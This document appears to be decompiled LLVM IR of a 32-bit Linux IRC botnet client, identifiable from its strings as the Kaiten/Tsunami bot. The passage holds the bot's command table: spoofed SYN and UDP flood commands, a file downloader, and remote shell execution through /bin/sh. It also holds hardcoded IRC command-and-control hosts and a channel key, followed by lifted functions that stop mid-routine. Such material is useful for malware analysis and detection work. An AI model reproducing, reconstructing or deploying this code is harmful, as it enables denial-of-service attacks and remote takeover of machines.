source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%rlimit = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }
%timespec = type { i32, i32 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805e1d8.21 = global i32 0
@global_var_805e204.22 = local_unnamed_addr global i32* @global_var_805e1d8.21
@global_var_805d1c4.23 = constant i32 0
@global_var_805e1dc.25 = local_unnamed_addr global i32 0
@global_var_8067528.28 = local_unnamed_addr global i32 0
@global_var_805a321.29 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_8062a90.30 = local_unnamed_addr global i32 0
@global_var_806764c.31 = local_unnamed_addr global i32 0
@1 = constant i32 1966014578
@global_var_805a341.35 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8067520.36 = local_unnamed_addr global i32 0
@global_var_805a351.37 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_805a36c.38 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_805a390.39 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_805a3b5.40 = constant [8 x i8] c"http://\00"
@global_var_805a3c0.41 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_805a3e8.42 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_805a410.43 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_805a524.44 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_805a540.45 = constant [3 x i8] c"wb\00"
@global_var_805a543.46 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_805a548.47 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_805a560.48 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_805a580.49 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_805a5ae.50 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_805a5cb.51 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_805a5e4.52 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_805a619.53 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_805a622.54 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_805a664.57 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_805a687.58 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_805a6a8.59 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_8067420.60 = global i32 0
@global_var_805a6d0.61 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_805a6ef.62 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_805a709.63 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_805a726.64 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_805a741.65 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_805a760.66 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_805a780.67 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8062ea0.68 = global i32 0
@global_var_805a7cc.69 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_805a7f0.70 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_805a817.71 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_805a840.72 = constant i32 2
@global_var_805a890.73 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_805a8b7.74 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_805a8d0.75 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_805a8f4.76 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_805a918.77 = constant [36 x i8] c"NOTICE %s :UNKNOWN <target> <secs>\0A\00"
@global_var_805a93c.78 = constant [27 x i8] c"NOTICE %s :Unknowning %s.\0A\00"
@global_var_805a957.79 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_8067640.80 = local_unnamed_addr global i32 0
@global_var_8062a80.81 = local_unnamed_addr global i32 0
@global_var_805a974.82 = constant [119 x i8] c"NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls\0A\00"
@global_var_805a9ec.83 = constant [123 x i8] c"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_805aa68.84 = constant [77 x i8] c"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\0A\00"
@global_var_805aab8.85 = constant [93 x i8] c"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\0A\00"
@global_var_805ab18.86 = constant [94 x i8] c"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\0A\00"
@global_var_805ab78.87 = constant [79 x i8] c"NOTICE %s :SERVER <server>                                  = Changes servers\0A\00"
@global_var_805abc8.88 = constant [89 x i8] c"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\0A\00"
@global_var_805ac24.89 = constant [92 x i8] c"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\0A\00"
@global_var_805ac80.90 = constant [103 x i8] c"NOTICE %s :DISABLE                                          = Disables all packeting from this client\0A\00"
@global_var_805ace8.91 = constant [102 x i8] c"NOTICE %s :ENABLE                                           = Enables all packeting from this client\0A\00"
@global_var_805ad50.92 = constant [80 x i8] c"NOTICE %s :KILL                                             = Kills the client\0A\00"
@global_var_805ada0.93 = constant [117 x i8] c"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_805ae18.94 = constant [90 x i8] c"NOTICE %s :VERSION                                          = Requests version of client\0A\00"
@global_var_805ae74.95 = constant [91 x i8] c"NOTICE %s :KILLALL                                          = Kills all current packeting\0A\00"
@global_var_805aed0.96 = constant [77 x i8] c"NOTICE %s :HELP                                             = Displays this\0A\00"
@global_var_805af20.97 = constant [96 x i8] c"NOTICE %s :IRC <command>                                    = Sends this command to the server\0A\00"
@global_var_805af80.98 = constant [82 x i8] c"NOTICE %s :SH <command>                                     = Executes a command\0A\00"
@global_var_805afd2.99 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_8067648.100 = local_unnamed_addr global i32 0
@global_var_8067524.101 = local_unnamed_addr global i32 0
@global_var_805b050.102 = constant [5 x i8] c"IRC \00"
@global_var_805b055.103 = constant [4 x i8] c"%s\0A\00"
@global_var_805b059.104 = constant [4 x i8] c"SH \00"
@global_var_805b060.105 = constant [60 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_805b09c.106 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_805b0ab.107 = constant i32 1330446336
@global_var_805afee.108 = constant [8 x i8] c"TSUNAMI\00"
@global_var_805e240.109 = local_unnamed_addr global [8 x i8]* @global_var_805afee.108
@global_var_805e244.110 = local_unnamed_addr global i32 134519406
@global_var_805b0ad.111 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_8067644.112 = local_unnamed_addr global i32 0
@global_var_805b0ba.113 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_805b0c7.114 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_805b0cf.115 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_805b0d8.116 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_805a300.121 = constant [17 x i8] c"irc.realunix.org\00"
@global_var_805a311.122 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_805e224.123 = global [2 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805a300.121, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805a311.122, i32 0, i32 0)]
@global_var_805b152.124 = constant [6 x i8] c"-bash\00"
@global_var_806752c.125 = local_unnamed_addr global i32 0
@global_var_805b158.126 = constant [9 x i8] c"#ASPOWER\00"
@global_var_805b161.127 = constant [10 x i8] c"510510510\00"
@global_var_805b16c.128 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_805b195.129 = constant i32 1380253706
@global_var_805b135.130 = constant [4 x i8] c"352\00"
@global_var_805e2c0.131 = global [4 x i8]* @global_var_805b135.130
@global_var_805e2c4.132 = global i32 134522968
@global_var_805b197.133 = constant [6 x i8] c"ERROR\00"
@global_var_8062320 = external global i32
@global_var_8062fec.134 = local_unnamed_addr global i32 0
@global_var_8062ff0.135 = local_unnamed_addr global i32 0
@global_var_8062500.136 = global i32 0
@global_var_8062ff4.137 = local_unnamed_addr global i32 0
@global_var_8067650.138 = local_unnamed_addr global i32 0
@global_var_8062518.139 = local_unnamed_addr global i32 0
@global_var_8062514.140 = local_unnamed_addr global i32 0
@global_var_8062ea4.141 = local_unnamed_addr global i32 0
@global_var_8062ea8.142 = local_unnamed_addr global i32 0
@global_var_80626e4.143 = local_unnamed_addr global i32 -1
@global_var_80626e0.144 = local_unnamed_addr global i32* @global_var_8062320
@global_var_8067660.145 = local_unnamed_addr global i32 0
@global_var_80626f0.146 = local_unnamed_addr global i32 34
@global_var_805e300.147 = global i32 0
@global_var_8062300.148 = local_unnamed_addr global i32 2
@global_var_8067654.149 = local_unnamed_addr global i32 0
@global_var_806765c.150 = local_unnamed_addr global i32 0
@global_var_8062548.151 = global i32 0
@global_var_8062544.152 = local_unnamed_addr global i32* @global_var_8062548.151
@global_var_806254c.153 = local_unnamed_addr global i32 0
@global_var_8062550.154 = global i32 0
@global_var_80626ec.155 = local_unnamed_addr global i32 33
@global_var_80626f8.156 = local_unnamed_addr global i32 134534297
@global_var_80672b4.157 = local_unnamed_addr global i32 0
@global_var_8062eac.158 = local_unnamed_addr global i32 0
@global_var_8062ff8.159 = local_unnamed_addr global i32 0
@global_var_8062ffc.160 = local_unnamed_addr global i32 0
@global_var_805e310.161 = global i32 0
@global_var_806251c.162 = local_unnamed_addr global i32* @global_var_805e310.161
@global_var_8062eb0.163 = global i32 0
@global_var_8062ec8.164 = global i32 0
@global_var_8062ecc.165 = global i32 0
@global_var_8062ed0.166 = global i32 0
@global_var_8062910.167 = global i32 0
@global_var_804c4dc.168 = constant i32 -2062498685
@global_var_8062ee0.169 = global i32 0
@global_var_804c534.170 = constant i32 -2057255805
@global_var_80626e8.171 = local_unnamed_addr global i32 32
@global_var_804c464.172 = constant i32 -1193113149
@global_var_8062fe8.173 = global i32 0
@global_var_8062fe4.174 = local_unnamed_addr global i32 0
@global_var_80627b8.175 = local_unnamed_addr global i32 35
@global_var_80627bc.176 = local_unnamed_addr global i32 64
@global_var_8063004.177 = local_unnamed_addr global i32 0
@global_var_805e320.178 = global i32 0
@global_var_8067668.179 = local_unnamed_addr global i32 0
@global_var_8065058.180 = global i32 0
@global_var_806505c.181 = global i32 0
@global_var_8062334.182 = local_unnamed_addr global i32 0
@global_var_8062820.183 = global i32 288
@global_var_80627dc.184 = global i32* @global_var_8062820.183
@global_var_8062364.185 = local_unnamed_addr global i32* @global_var_8065058.180
@global_var_806236c.186 = local_unnamed_addr global i32* @global_var_806505c.181
@global_var_8062810.187 = local_unnamed_addr global i32 2
@global_var_8063000.188 = local_unnamed_addr global i32 0
@global_var_8067664.189 = local_unnamed_addr global i32 0
@global_var_80624bc.190 = local_unnamed_addr global i32 0
@global_var_80626ac.192 = local_unnamed_addr global i32 0
@global_var_80626a8.193 = local_unnamed_addr global i32 0
@global_var_8062510.194 = local_unnamed_addr global i32 0
@global_var_8063008.195 = global i32 0
@global_var_8063020.196 = global i32 0
@global_var_806302c.197 = local_unnamed_addr global i32 0
@global_var_804f0ba.198 = constant [4 x i8] c"XZj\00"
@global_var_8063040.199 = global i32 0
@global_var_8063044.200 = global i32 0
@global_var_8065040.201 = global i32 0
@global_var_8062870.203 = local_unnamed_addr global i32 272
@global_var_80627f8.205 = global i32 0
@global_var_806507c.206 = local_unnamed_addr global i32 0
@global_var_8065080.207 = local_unnamed_addr global i32 0
@global_var_8065060.208 = global i32 0
@global_var_8065078.209 = local_unnamed_addr global i32 0
@global_var_805b500.210 = constant [3 x i8] c"-c\00"
@global_var_805b508.211 = constant [3 x i8] c"sh\00"
@global_var_805b503.212 = constant [8 x i8] c"/bin/sh\00"
@global_var_80627e0.213 = global i32 0
@global_var_805b50c.214 = constant i32 0
@global_var_805b524.215 = constant [6 x i8] c"(nil)\00"
@global_var_805b52a.216 = constant [7 x i8] c"(null)\00"
@global_var_805b531.217 = constant i32 2949163
@global_var_805b59e.219 = constant i32 327688
@global_var_8062a20 = external local_unnamed_addr global i32
@global_var_805c7e0.221 = constant i32 65536
@global_var_805b596.222 = constant [8 x i8] c" +0-#'I\00"
@global_var_805b544.223 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805b581.224 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805b577.225 = constant i32 117506048
@global_var_805b568.226 = constant i32 331776
@global_var_805b5e0.227 = constant [8 x i8] c"Success\00"
@global_var_805b5c2.228 = constant [15 x i8] c"Unknown error \00"
@global_var_8062a28.229 = local_unnamed_addr global i32* @global_var_805c7e0.221
@global_var_80670a0.230 = global i32 0
@global_var_80670c0.231 = global i32 0
@global_var_806728c.232 = global i32 0
@global_var_8062a48.233 = global i32 0
@global_var_8067ac0.234 = local_unnamed_addr global i32 0
@global_var_8067ab4.235 = global i32 0
@global_var_80676ac.237 = global i32 0
@global_var_80676b0.238 = local_unnamed_addr global i32 0
@global_var_80676b4.239 = global i32 0
@global_var_80676c0.240 = local_unnamed_addr global i32 0
@global_var_80679b4.241 = global i32 0
@global_var_80679dc.242 = local_unnamed_addr global i32 0
@global_var_80679cc.243 = local_unnamed_addr global i32 0
@global_var_80679d0.244 = local_unnamed_addr global i32 0
@global_var_80679d4.245 = local_unnamed_addr global i32 0
@global_var_80679d8.246 = local_unnamed_addr global i32 0
@global_var_80679e4.247 = local_unnamed_addr global i32 0
@global_var_80679f0.248 = local_unnamed_addr global i32 0
@global_var_80679e8.249 = local_unnamed_addr global i32 0
@global_var_80679f4.250 = local_unnamed_addr global i32 0
@global_var_80679c8.251 = local_unnamed_addr global i32 0
@global_var_80679c4.253 = local_unnamed_addr global i32 0
@global_var_80679ec.254 = local_unnamed_addr global i32 0
@global_var_80676bc.255 = local_unnamed_addr global i32 0
@global_var_8062928.256 = global i32 0
@global_var_8062940.258 = global i32 0
@global_var_8062958 = external global i32
@global_var_8062984.260 = global i32 -1726662223
@global_var_8062960.261 = local_unnamed_addr global i32* @global_var_8062984.260
@global_var_806295c.262 = global i32* @global_var_8062984.260
@global_var_805c154.263 = constant i32 0
@global_var_805c140.264 = constant i32 0
@global_var_8062a00.265 = global i32 0
@global_var_80672a4.266 = local_unnamed_addr global i32 0
@global_var_80672b0.267 = local_unnamed_addr global i32 0
@global_var_80672a8.269 = global i32 0
@global_var_805e1c8.270 = global i32 -1
@global_var_8053d8b.271 = constant i32 -294069
@global_var_80672b8.272 = local_unnamed_addr global i32 0
@global_var_80672bc.273 = local_unnamed_addr global i32 0
@global_var_805c3c0.274 = constant [10 x i8] c"/dev/null\00"
@global_var_80672ac.276 = local_unnamed_addr global i32 0
@global_var_8053f71.278 = constant i32 1928542531
@global_var_8053f95.279 = constant i32 1928542531
@global_var_80672e0.280 = global i32 0
@global_var_80672c4.282 = global i32 0
@global_var_8067a8c.283 = global i32 0
@global_var_8067aa0.284 = global i32 0
@global_var_8067a90.285 = global i32 0
@global_var_8067a00.286 = global i32 0
@global_var_8067408.287 = local_unnamed_addr global i32 0
@global_var_805c9f0.289 = constant [4 x i8] c"inf\00"
@global_var_805c9f3.294 = constant i32 1179535616
@global_var_805ca00.295 = constant i32 2883630
@global_var_80627d0 = external local_unnamed_addr global i32
@global_var_805caf8.297 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_8062a2c.298 = global i32 134567723
@global_var_8067a80.299 = global i32 0
@global_var_80673a8.300 = global i32 0
@global_var_80673c4.302 = global i32 0
@global_var_805cb40.308 = constant i32 0
@global_var_805cb58.309 = constant i32 134572241
@global_var_805cb64.310 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_80673dc.311 = global i32 0
@global_var_805cbbd.312 = constant i32 0
@global_var_805cb88.313 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_805cba3.314 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_805cbe0.315 = constant i32 134574652
@global_var_8067ac4.319 = local_unnamed_addr global i32 0
@global_var_805cc08.320 = constant i32 1697579054
@global_var_805cc3c.321 = constant i32 1868824690
@global_var_805cc0a.322 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805cc1b.323 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805cc33.324 = constant [11 x i8] c"nameserver\00"
@global_var_805cc3e.325 = constant [7 x i8] c"domain\00"
@global_var_805cc45.326 = constant [7 x i8] c"search\00"
@global_var_8067aa4.327 = global i32 0
@global_var_8067ae0.328 = global i32 0
@global_var_80673fc.329 = local_unnamed_addr global i32 0
@global_var_80581de.330 = constant i32 -1592736637
@global_var_8067400.331 = local_unnamed_addr global i32 0
@global_var_8067404.332 = local_unnamed_addr global i32 0
@global_var_8067b60.333 = local_unnamed_addr global i32 0
@global_var_8067b64.334 = local_unnamed_addr global i32 0
@global_var_805cc4c.335 = constant i32 134581020
@global_var_805cc60.337 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_805cc78.338 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_805ccad.339 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_805ccc4.344 = constant [24 x i8] c"Cannot register service\00"
@global_var_8067410.345 = local_unnamed_addr global i32 0
@global_var_805ccec.346 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_805cd1a.347 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805cd17.349 = constant [3 x i8] c"%x\00"
@global_var_805cd2b.350 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805cd36.351 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805cd6c.352 = constant [3 x i8] c": \00"
@global_var_805cd6e.353 = constant i32 539828224
@global_var_805cd48.354 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_805cf60.355 = constant i32 0
@global_var_805cf64.356 = constant i32 0
@global_var_805d000.357 = constant [13 x i8] c"RPC: Success\00"
@global_var_805cd50.358 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_805cd6a.359 = constant [5 x i8] c"%s: \00"
@global_var_805cd6f.360 = constant [4 x i8] c" - \00"
@global_var_805cd73.362 = constant [13 x i8] c"; errno = %s\00"
@global_var_805ce44.363 = constant i32 0
@global_var_805ce80.364 = constant [18 x i8] c"Authentication OK\00"
@global_var_805ce40.365 = constant i32 0
@global_var_805cda8.366 = constant [9 x i8] c"; why = \00"
@global_var_805cdb1.367 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_805cd80.368 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_805cdd5.369 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_805e1cc.370 = global i32 134534905
@global_var_8062a60.20 = local_unnamed_addr global i8 0
@global_var_8062aa0.26 = external global i8*
@global_var_8062a84.27 = local_unnamed_addr global i8 0
@global_var_8062a88.32 = external global i8*
@global_var_8062a8c.33 = local_unnamed_addr global i64 0
@global_var_8062a8b.117 = external local_unnamed_addr global i8*
@global_var_8062a8a.118 = external local_unnamed_addr global i8*
@global_var_8062a89.119 = external global i8*
@global_var_805e220.120 = local_unnamed_addr global i64 578047347582304260
@global_var_80624c0.191 = local_unnamed_addr global i8 0
@global_var_805b5b6.218 = external constant i8*
@global_var_8067680.236 = global i8 0
@global_var_80679e0.252 = local_unnamed_addr global i8 0
@global_var_80672a0.257 = local_unnamed_addr global i8 0
@global_var_80672c0.275 = local_unnamed_addr global i8 0
@global_var_80673c0.301 = local_unnamed_addr global i8 0
@global_var_80673e0.316 = external global i8*
@global_var_80673f8.317 = local_unnamed_addr global i64 0
@global_var_8062a44.318 = local_unnamed_addr global i16 1
@global_var_806740c.336 = local_unnamed_addr global i16 0
@global_var_805a33f.34 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 90435
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8062a60.20, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805e204.22 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805e204.22 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805e204.22 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8062a60.20, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805e204.22 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8062a60.20, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805d1c4.23 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_805e1dc.25, align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134524309, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134587112, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804818b = load i32, i32* @ebx, align 4
  store i32 %v0_804818b, i32* %stack_var_-8, align 4
  %v4_804818f = ptrtoint i8* %arg1 to i32
  %v2_8048192 = load i8, i8* %arg1, align 1
  %v12_804819a = icmp eq i8 %v2_8048192, 42
  br i1 %v12_804819a, label %dec_label_pc_80481c1, label %dec_label_pc_80481a0

dec_label_pc_80481a0:                             ; preds = %entry
  %v12_80481a0 = icmp eq i8 %v2_8048192, 63
  br i1 %v12_80481a0, label %dec_label_pc_8048213, label %dec_label_pc_80481a6

dec_label_pc_80481a6:                             ; preds = %dec_label_pc_80481a0
  %v4_80481a6 = icmp eq i8 %v2_8048192, 0
  br i1 %v4_80481a6, label %dec_label_pc_80481b1, label %dec_label_pc_804824d

dec_label_pc_80481b1:                             ; preds = %dec_label_pc_80481a6
  %v2_80481b4 = load i8, i8* %tmp13, align 1
  %v2_80481b6 = sext i8 %v2_80481b4 to i32
  br label %dec_label_pc_80482aa

dec_label_pc_80481c1:                             ; preds = %entry
  %v1_80481c4 = add i32 %v4_804818f, 1
  %v5_80481cb = inttoptr i32 %v1_80481c4 to i8*
  %v5_80481cc = call i32 @strwildmatch(i8* %v5_80481cb, i32 %arg2)
  %v1_80481d4 = icmp eq i32 %v5_80481cc, 0
  br i1 %v1_80481d4, label %dec_label_pc_8048201, label %dec_label_pc_80481d8

dec_label_pc_80481d8:                             ; preds = %dec_label_pc_80481c1
  %v2_80481db = load i8, i8* %tmp13, align 1
  %v4_80481dd = icmp eq i8 %v2_80481db, 0
  br i1 %v4_80481dd, label %dec_label_pc_8048208, label %dec_label_pc_80481e1

dec_label_pc_80481e1:                             ; preds = %dec_label_pc_80481d8
  %v1_80481e4 = add i32 %arg2, 1
  %v5_80481ec = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_80481e4)
  %v1_80481f4 = icmp eq i32 %v5_80481ec, 0
